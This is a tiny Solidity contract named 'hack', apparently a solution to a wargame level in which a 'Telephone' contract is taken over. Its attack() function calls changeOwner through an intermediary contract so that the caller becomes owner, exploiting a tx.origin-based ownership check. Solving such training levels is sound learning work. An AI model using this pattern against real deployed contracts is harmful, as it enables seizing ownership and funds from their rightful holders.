// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import 'Telephone.sol';

contract hack {
    Telephone private immutable target;

    constructor (address target_) {
        target = Telephone(target_);
    }

    function attack() external {
        target.changeOwner(msg.sender);
    }
}
//demo
